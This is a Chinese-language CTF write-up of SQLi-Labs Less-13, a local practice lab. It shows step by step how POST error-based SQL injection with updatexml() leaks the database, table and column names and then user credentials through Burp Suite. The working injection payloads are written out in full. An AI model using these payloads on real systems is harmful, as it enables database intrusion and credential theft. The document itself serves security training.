【SQLi-Labs】Less-13 POST型双注入（报错注入）Writeup

操作者：何芊宏 | 操作日期：2026.10.24 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, POST注入, 报错注入, Burp Suite

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-13 (POST - Double Injection - Single quotes - String - with twist)
  • 提示：POST请求，双注入（此处指报错注入），单引号+括号闭合

2. 解题思路与前置原理

本关卡为 POST 登录框。通过观察前端源码可知，若登录成功，页面仅返回一张静态图片（flag.jpg），并不回显数据库数据。因此，常规的联合查询（UNION）无法直接获取数据。

根据题目提示 "Single quotes with twist" 与 "Double Injection"，需使用 Burp Suite 抓包，测试出闭合方式（单引号加括号 ')），并采用 报错注入（Error-based Injection）。通过引入 MySQL 的 updatexml() 函数，故意构造非法 XPath 路径，将目标数据夹带在报错信息中输出。

3. 工具配置与操作步骤

工具环境：Burp Suite（需配置浏览器代理 127.0.0.1:8080，使用 Repeater 模块修改请求体）。

第一步：抓包与探测闭合方式

在登录框随意输入，抓取 POST 请求并发送至 Repeater。在请求体（Body）中测试闭合符：

  • 输入 uname=admin'&passwd=123&submit=Submit，页面回显 LOGIN ATTEMPT FAILED（无报错）。
  • 输入 uname=admin')&passwd=123&submit=Submit，页面报出 SQL 语法错误：near '123456') LIMIT 0,1'。

解释与原理：报错信息证明单引号和括号成功闭合了 username 字段。推断后台 SQL 为 SELECT * FROM users WHERE username=('$uname') AND password=('$passwd') LIMIT 0,1。

第二步：利用 updatexml 获取库名

构造报错注入 Payload，使用 # 注释掉后续的密码验证逻辑：

uname=1') AND updatexml(1, concat(0x7e, (select database()), 0x7e), 1) #&passwd=123456&submit=Submit

回显现象：页面报错 XPATH syntax error: '~security~'。

解释与原理：0x7e 是十六进制的波浪号 ~。由于 updatexml 要求第二个参数必须是合法的 XPath 路径，传入包含 ~ 的字符串会强制触发报错，从而将库名 `security` 打印出来。

第三步：获取表名与列名

爆表名：

uname=1') AND updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 0x7e), 1) #&passwd=123456&submit=Submit

回显：~emails,referrers,uagents,users~。

爆列名：

uname=1') AND updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'), 0x7e), 1) #&passwd=123456&submit=Submit

回显：~id,username,password~。

第四步：提取最终数据（触发截断）

构造查询账号密码的 Payload，使用 0x3a（冒号）进行拼接：

uname=1') AND updatexml(1, concat(0x7e, (select group_concat(username, 0x3a, password) from security.users), 0x7e), 1) #&passwd=123456&submit=Submit

回显现象：页面报错 XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'。

解释与原理：updatexml 报错信息最大仅支持 32 个字符。虽然数据被截断，但已成功证明并提取了部分明文数据。

4. 踩坑记录与复盘

  • POST 型注入特性：参数隐藏在请求体中，无法通过 URL 直接修改。需掌握 Burp Suite 抓包、发送到 Repeater 并修改 Body 的操作。
  • 报错注入的截断限制：受限于 updatexml 底层机制，只能显示 32 字符。实战中若需全量数据，需配合 substr() 函数进行分段截取，或编写 Python 脚本进行自动化遍历。
  • 十六进制标识符的妙用：使用 0x7e (波浪号) 和 0x3a (冒号) 能够有效避免引号在复杂 POST 请求体中被转义或过滤，同时作为数据边界标志，方便肉眼识别。

5. 知识点总结

  • 双引号/单引号带括号闭合：应对特定的 SQL 语句嵌套结构，需在闭合时同时补齐对应的括号。
  • 报错注入（Error-based）：在无回显但有报错的场景下，利用函数机制缺陷强行让数据在错误信息中输出。
